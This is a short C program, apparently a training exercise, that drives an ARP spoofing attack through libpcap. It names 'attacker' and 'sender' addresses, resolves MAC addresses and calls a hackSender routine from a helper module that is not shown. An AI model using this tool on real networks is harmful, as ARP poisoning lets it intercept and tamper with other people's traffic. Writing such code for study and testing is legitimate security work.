#include <stdio.h>
#include <memory.h>
#include <netinet/if_ether.h>
#include <pcap.h>
#include "module.h"

void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
  if (argc%2 != 0) {
    usage();
    return -1;
  }

  char * dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  uint8_t sender_ip[4], target_ip[4], attacker_ip[4];
  parseIP(sender_ip, argv[2]);
  parseIP(target_ip, argv[3]);
  printf("Sender ip : %s", printIPAddress(sender_ip));
  printf("Target ip : %s", printIPAddress(target_ip));

  parseIP(attacker_ip, getAttackerIPAddress(dev));
  printf("Attaker ip : %s\n", printIPAddress(attacker_ip));

  u_char * attacker_mac_address = getAttackerMacAddress(dev);
  printf("Attacker Mac Address : %s", printMacAddress(attacker_mac_address));

  u_char * sender_mac_address = getSenderMacAddress(handle, attacker_mac_address, attacker_ip, sender_ip);
  printf("Sender Mac Address : %s", printMacAddress(sender_mac_address));

  hackSender(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip);

  passTest(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip);

  pcap_close(handle);
  return 0;
}